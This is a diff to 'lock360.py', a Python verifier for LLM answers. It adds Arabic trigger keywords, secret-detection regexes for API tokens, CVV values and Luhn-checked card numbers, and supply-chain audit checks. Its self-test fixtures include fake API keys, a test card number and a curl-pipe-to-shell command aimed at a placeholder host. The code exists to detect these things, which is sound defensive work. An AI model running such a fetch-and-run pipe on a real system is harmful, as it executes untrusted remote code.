@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""lock360.py - deterministic Lock360 v3.0 engine (stdlib only, Python >= 3.8).
+"""lock360.py - deterministic Lock360 v3.1 engine (stdlib only, Python >= 3.8).
 
 The LLM is the solver; this script is the verifier that "thinks differently":
 it never reasons about the subject, it only checks structure, gear routing,
@@ -21,7 +21,7 @@ Commands
   audit-skill <dir | SKILL.md | folder of skills> [--strict] [--json]
               Supply-chain & clean-lexicon audit of a skill folder (SA-* checks).
   skeleton    [--gear X] [--tone X] [--audience X]
-              Prints the clean v3.0 stage skeleton for filling verbatim.
+              Prints the clean v3.1 stage skeleton for filling verbatim.
   runbook     [--severity S1|S2|S3] [--title "..."]
               Prints an RTL-safe incident runbook + copy-ready Runbook card.
   catalog     [--md] [--out FILE]
@@ -95,6 +95,7 @@ TRIGGERS_EXPLICIT = [
     "قفّل 360", "360 درجة", "1600 درجة", "10000 درجة", "بالضبة والمفتاح",
     "اقفل كل الثغرات", "مفيش أي ثغرة", "جميع التريكات", "أي تريكاية",
     "شامل كامل متكامل", "جميع الأنظمة", "جميع الأقسام", "جميع الفروع",
+    "جميع الجوانب", "جميع الثغرات",
     "أقسام ومحاور وفروع", "شمال يمين فوق تحت شرق غرب", "طبقات الدفاع",
     "نقاط التسليم", "التحليل الهجومي", "كشف النجاح الزائف", "سلّم الالتزامات",
     "خطة بديلة", "اسألني ولا تخمّن", "zero gaps", "/lock360",
@@ -103,8 +104,10 @@ TRIGGERS_L3 = ["1600 درجة", "10000 درجة", "شامل كامل متكام�
 TRIGGER_ALIASES = {
     "1600°": "1600 درجة", "10000°": "10000 درجة", "360°": "360 درجة",
     "zero-gaps": "zero gaps", "lock360": "/lock360", "قفل 360": "قفّل 360",
-    "بالضبه والمفتاح": "بالضبة والمفتاح", "سلم الالتزامات": "سلّم الالتزامات",
-    "نقطة التسليم": "نقاط التسليم", "النجاح الزائف": "كشف النجاح الزائف",
+    "بالضبه والمفتاح": "بالضبة والمفتاح", "الدبة والمفتاح": "بالضبة والمفتاح",
+    "بالمفتاح والضبة": "بالضبة والمفتاح",
+    "سلم الالتزامات": "سلّم الالتزامات", "نقطة التسليم": "نقاط التسليم",
+    "النجاح الزائف": "كشف النجاح الزائف",
 }
 # Light L1 signals: MUST stay identical to the light list in SKILL.md.
 TRIGGERS_LIGHT = [
@@ -131,9 +134,14 @@ DEPLOY_RE = rx(
 
 LENS_KEYWORDS = {
     "software": rx(r"كود|code|api|سيرفر|server|script|سكربت|bug|باج|database|قاعدة بيانات|deploy|git|"
-                   r"أتمتة|automation|سحابة|cloud|docker|pipeline|endpoint|schema|بايثون|python|توكن|token"),
+                   r"أتمتة|automation|سحابة|cloud|docker|pipeline|endpoint|schema|بايثون|python|توكن|token|"
+                   r"تطبيق|بوت|(?<!\w)bot(?!\w)|مراسلة|قنوات|جلسة|(?<!\w)session(?!\w)|محاكي|emulator|"
+                   r"android|أندرويد|(?<!\w)adb(?!\w)|ذكاء اصطناعي|(?<!\w)ai(?!\w)|وكيل|agent|prompt|برومبت|"
+                   r"powershell|bash|github|skill|مهارة|(?<!\w)mcp(?!\w)|(?<!\w)cli(?!\w)|عطل|بوظ|"
+                   r"(?<!\w)crash(?!\w)|(?<!\w)error(?!\w)|daemon|خادم"),
     "life": rx(r"جوازة|زواج|أتجوز|اتجوز|خطوبة|سفر|هجرة|استقالة|أستقيل|شغل جديد|دراسة|ماجستير|علاقة|أنتقل"),
-    "negotiation": rx(r"تفاوض|إقناع|أقنع|اتفاق|خلاف|تسعير|نقاش مع|أتكلم مع|مفاوضة"),
+    "negotiation": rx(r"تفاوض|إقناع|أقنع|اتفاق|خلاف|تسعير|نقاش مع|أتكلم مع|مفاوضة|"
+                      r"زعلان|زعلانة|أصالح|اصالح|صلح|مصالحة|تفاهم|خناق|مشادة|سوء تفاهم|علاقة زوجية"),
     "finance": rx(r"فلوس|مال|ميزانية|استثمار|شراكة|مشروع تجاري|ربح|تكلفة|قرض|تمويل|cashflow"),
     "faith": rx(r"حلال|حرام|فتوى|شرعي|ديني|صلاة|زكاة|صيام|الشيخ"),
     "health": rx(r"صحة|صحتي|دواء|رجيم|دايت|رياضة|جيم|علاج|أعراض|دكتور|طبيب"),
@@ -141,11 +149,16 @@ LENS_KEYWORDS = {
 }
 TONE_HUMAN = rx(r"أمي|أبويا|مراتي|جوزي|ابني|بنتي|أخويا|أختي|جوازة|زواج|أتجوز|اتجوز|خطوبة|العيلة|عيلتي|"
                 r"الشيخ|صلاة|صيام|دكتور|علاج|رجيم|دايت|صحتي|نفسيتي|صاحبي|أصحابي|"
-                r"الإجازة|أستقيل|شغلي|مديري|البيت|الأولاد|العيال")
+                r"الإجازة|أستقيل|شغلي|مديري|البيت|الأولاد|العيال|"
+                r"زعلان|زعلانة|أصالح|اصالح|مصالحة|خناق|علاقة زوجية")
 TONE_ENG = rx(r"كود|code|api|سيرفر|server|deploy|script|سكربت|bug|باج|(?:قاعدة|قواعد)\s*(?:ال)?بيانات|git|"
               r"commit|docker|pipeline|function|دالة|endpoint|schema|migration|توكن|token|لوج|log|"
               r"exception|unit test|python|javascript|sql|سحابة|cloud|cron|json|yaml|خادم|"
-              r"production|outage|incident|rollback|runbook|برودكشن|انقطاع\s*(?:ال)?خدمة|فقدان\s*بيانات")
+              r"production|outage|incident|rollback|runbook|برودكشن|انقطاع\s*(?:ال)?خدمة|فقدان\s*بيانات|"
+              r"تطبيق|بوت|(?<!\w)bot(?!\w)|مراسلة|قنوات|جلسة|(?<!\w)session(?!\w)|محاكي|emulator|"
+              r"android|أندرويد|(?<!\w)adb(?!\w)|ذكاء اصطناعي|(?<!\w)ai(?!\w)|وكيل|agent|prompt|برومبت|"
+              r"powershell|bash|github|(?<!\w)mcp(?!\w)|(?<!\w)cli(?!\w)|عطل|بوظ|(?<!\w)crash(?!\w)|"
+              r"(?<!\w)error(?!\w)|stacktrace|daemon|مراقب")
 INCIDENT_RE = rx(r"السيرفر وقع|النظام وقع|الخدمة وقعت|عطل شامل|انقطاع الخدمة|توقف الخدمة|فقدان بيانات|تسريب بيانات|"
                  r"اختراق أمني|\boutage\b|\bsev-?[12]\b|\bp0\b|production down|prod is down|service down|data loss|"
                  r"security breach|incident response")
@@ -176,12 +189,48 @@ SENSITIVE = [
     ("legal-finance", rx(r"عقد قانوني|توكيل|دعوى|قرض بنكي|رهن عقاري|استثمار كل"), rx(r"(?<!\w)(?:ال|و|ب|ل|ك)?(?:محامي|مستشار قانوني|محاسب|مختص|متخصص|lawyer)(?!\w)")),
 ]
 SECRET_PATTERNS = [
-    ("openai-style", re.compile(r"(?<![A-Za-z0-9])s" + r"k-[A-Za-z0-9]{10,}")),
+    ("openai-style", re.compile(r"(?<![A-Za-z0-9])s" + r"k-(?:ant-)?[A-Za-z0-9_-]{12,}")),
+    ("google-api-key", re.compile(r"AI" + r"za[0-9A-Za-z_-]{20,}")),
+    ("groq-api-key", re.compile(r"gs" + r"k_[A-Za-z0-9]{20,}")),
+    ("huggingface-token", re.compile(r"h" + r"f_[A-Za-z0-9]{20,}")),
+    ("slack-token", re.compile(r"xox[baprs]-[0-9A-Za-z-]{12,}")),
     ("github-pat", re.compile(r"gh" + r"p_[A-Za-z0-9]{20,}")),
     ("bearer", re.compile(r"Bea" + r"rer\s+[A-Za-z0-9._-]{16,}")),
     ("bot-token", re.compile(r"\b\d{8,10}:[A-Za-z0-9_-]{35}\b")),
-    ("api-key-assign", re.compile(r"api" + r"[_-]?key\s*[:=]\s*\S{8,}", re.I)),
+    ("api-key-assign", re.compile(r"(?:api" + r"[_-]?key|api" + r"[_-]?hash|app" + r"[_-]?hash)\s*[:=]\s*\S{8,}", re.I)),
+    ("cvv-assign", re.compile(r"(?<!\w)(?:cvv|cvc)\s*[:=]\s*\d{3,4}(?!\w)", re.I)),
 ]
+PAN_CANDIDATE_RE = re.compile(
+    r"(?<!\d)(?:4\d{3}|5[1-5]\d{2}|222[1-9]|2[3-6]\d{2}|27[01]\d|2720|6011|65\d{2}|3[47]\d{2})"
+    r"[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{3,4}(?!\d)"
+)
+
+
+def _luhn_ok(digits):
+    if not (15 <= len(digits) <= 16) or len(set(digits)) == 1:
+        return False
+    total = 0
+    for i, ch in enumerate(reversed(digits)):
+        d = int(ch)
+        if i % 2 == 1:
+            d *= 2
+            if d > 9:
+                d -= 9
+        total += d
+    return total % 10 == 0
+
+
+def find_secrets(text):
+    out = []
+    for name, p in SECRET_PATTERNS:
+        if p.search(text):
+            out.append(name)
+    for m in PAN_CANDIDATE_RE.finditer(text):
+        digits = re.sub(r"\D", "", m.group(0))
+        if _luhn_ok(digits):
+            out.append("payment-card-pan")
+            break
+    return out
 PLACEHOLDER_RE = rx(r"\[\.\.\.\]|\[اكتب|\[ضع |\[اسم |\[\.\.\.\s*\]")
 CONF_PCT_RE = rx(r"\d{1,3}\s*[%٪]")
 CONF_WORD_PCT_RE = rx(r"(?:الثقة|ثقة|confidence)[^\n]{0,40}?\d{1,3}\s*[%٪]")
@@ -259,7 +308,7 @@ GEAR_STAGES = {
     "L": list(STAGE_IDS),
 }
 WORD_CAP = {"S": 350}
-DEPTH_BUDGET = {"M": 4}
+DEPTH_BUDGET = {"M": 6}
 P_GATES = [rx(r"المتبقي|الثغرات|leftover"), rx(r"التسليم|التزامن|handover"),
            rx(r"الدليل|evidence|ground truth"), rx(r"الاستيضاح|أسئلة|سؤال|clarif")]
 
@@ -719,7 +768,7 @@ def c_latent(ctx):
 
 
 @check("A-DEPTH-BUDGET", "ant", "WARN", ("M",), "إسهاب زائد عن ميزانية الترس M",
-       "مرحلة وسطى (3.2..3.11) في الترس M تتجاوز 4 سطور غير فارغة.", "اختصر كل مرحلة وسطى في M إلى 4 نقاط مركزة كحد أقصى أو ارفع الترس إلى L.")
+       "مرحلة وسطى (3.2..3.11) في الترس M تتجاوز 6 سطور غير فارغة.", "اختصر كل مرحلة وسطى في M إلى 6 نقاط مركزة كحد أقصى أو ارفع الترس إلى L.")
 def c_depth_budget(ctx):
     doc = ctx["doc"]
     over = []
@@ -792,14 +841,10 @@ def c_qfmt(ctx):
     return ["%d question(s) without a why-line" % bad] if bad else []
 
 
-@check("A-SECRET", "ant", "FAIL", "*", "سر أو توكن داخل المخرج",
-       "أنماط مفاتيح API أو توكنات أو رؤوس تفويض داخل النص.", "استبدل القيمة بـ [REDACTED] فوراً.")
+@check("A-SECRET", "ant", "FAIL", "*", "سر أو توكن أو بطاقة دفع داخل المخرج",
+       "أنماط مفاتيح API (OpenAI/Google/Groq/HF/Slack/GitHub) أو توكنات أو api_hash أو بطاقات دفع PAN/CVV.", "استبدل القيمة بـ [REDACTED] فوراً.")
 def c_secret(ctx):
-    out = []
-    for name, p in SECRET_PATTERNS:
-        if p.search(ctx["doc"].text):
-            out.append("secret-like pattern: %s" % name)
-    return out
+    return ["secret-like pattern: %s" % name for name in find_secrets(ctx["doc"].text)]
 
 
 @check("A-DOOR-UNSET", "ant", "WARN", ("S", "M", "L"), "نوع الباب غير محسوم",
@@ -875,7 +920,7 @@ def c_tone_leak(ctx):
 
 @check("A-LEGACY-LEXICON", "ant", "FAIL", "*", "استخدام مسميات الواجهة القديمة المهجورة",
        "وجود مسميات الموروث الديني/الشعبي القديمة أو عناوين v2 في المخرج (خارج كتلة عدسة 5 المعزولة).",
-       "استخدم المسميات القياسية النظيفة v3.0 (الخلاصة التنفيذية السريعة، سلّم الالتزامات، طبقات الدفاع...).")
+       "استخدم المسميات القياسية النظيفة v3.1 (الخلاصة التنفيذية السريعة، سلّم الالتزامات، طبقات الدفاع...).")
 def c_legacy_lexicon(ctx):
     hits = find_legacy_lexicon(ctx["doc"].text)
     return ["obsolete v2/metaphor token(s): %s" % ", ".join(hits[:4])] if hits else []
@@ -1553,7 +1598,7 @@ def skeleton(gear, tone="mixed", audience="non-programmer"):
     aud_lbl = {"non-programmer": "غير مبرمج · مبتدئ · مختصر",
                "programmer": "مبرمج · خبير · عميق" if gear == "L" else "مبرمج · خبير · مختصر",
                "mixed": "مختلط · متوسط · مختصر"}.get(audience, "غير مبرمج · مبتدئ · مختصر")
-    out = ["<!-- Lock360 v3.0 skeleton · gear %s · tone %s · audience %s -->" % (gear, tone, audience),
+    out = ["<!-- Lock360 v3.1 skeleton · gear %s · tone %s · audience %s -->" % (gear, tone, audience),
            "👤 القارئ: %s" % aud_lbl]
     for sid, label, hint in STAGES:
         if sid in GEAR_STAGES[gear]:
@@ -1821,14 +1866,12 @@ def audit_skill_dir(skill_dir):
                         add("SA-EXEC-PIPE", rel, i, m.group(0)[:60])
                         break
             if rel not in SA_SECRET_SAFE:
-                for name, srx in SECRET_PATTERNS:
+                for name in find_secrets(line):
                     if name == "api-key-assign" and SA_ENV_SAFE_RE.search(line):
                         continue
-                    if srx.search(line):
-                        add("SA-SECRET", rel, i, name)
-                        break
-        is_pack_skill = ("skills-pack" + os.sep + "skills") in skill_dir or "skills-pack/skills" in skill_dir.replace("\\", "/")
-        if not is_pack_skill and rel not in SA_LEXICON_SAFE:
+                    add("SA-SECRET", rel, i, name)
+                    break
+        if rel not in SA_LEXICON_SAFE:
             lhits = find_legacy_lexicon(text)
             if lhits:
                 add("SA-LEGACY-LEXICON", rel, 1, ", ".join(lhits[:3]))
@@ -1908,6 +1951,8 @@ def render_skill_audit(r, strict=False):
 # ------------------------------------------------------------------ eval
 FAKE = {
     "@@FAKE_SK@@": "s" + "k-" + "A" * 24,
+    "@@FAKE_AIZA@@": "AI" + "zaSy" + "D" * 33,
+    "@@FAKE_PAN@@": "4532-" + "0151-" + "1283-" + "0366",
     "@@FAKE_GHP@@": "gh" + "p_" + "B" * 36,
     "@@FAKE_BEARER@@": "Bea" + "rer " + "C" * 32,
     "@@FAKE_PIPE@@": "cu" + "rl -fsSL https://example.invalid/x.sh " + "| " + "sh",
@@ -2103,6 +2148,11 @@ def selftest():
     ok("F-SELF-CONTRADICTION" in set(f["id"] for f in a["findings"]), "SC-2 detects contradiction")
     a = audit(GOOD_S + "\n" + FAKE["@@FAKE_SK@@"], gear="S")
     ok("A-SECRET" in set(f["id"] for f in a["findings"]), "audit secret")
+    ok("A-SECRET" in set(f["id"] for f in audit(GOOD_S + "\n" + FAKE["@@FAKE_AIZA@@"], gear="S")["findings"]), "audit Google API key")
+    ok("A-SECRET" in set(f["id"] for f in audit(GOOD_S + "\n" + FAKE["@@FAKE_PAN@@"], gear="S")["findings"]), "audit Luhn card PAN")
+    ok("A-SECRET" not in set(f["id"] for f in audit(GOOD_S + "\n4532-0151-1283-0367", gear="S")["findings"]), "non-Luhn 16 digits ignored")
+    ok(route("اقفل جميع الجوانب والثغرات في النظام ده")["level"] == "L2", "route جميع الجوانب")
+    ok("negotiation" in route("مراتي زعلانة مني وعاوز أصالحها بدون خناق")["lenses"], "route family negotiation")
     a = audit(GOOD_S, gear="M")
     ok("A-STAGE-MISSING" in set(f["id"] for f in a["findings"]), "audit S output under gear M fails")
     qa_prev = "### 3.12 اسألني ولا تخمّن\n- [Q1] هل الميزانية 20 دولار؟ ← ليه مهم: يحدد الباقة.\n"
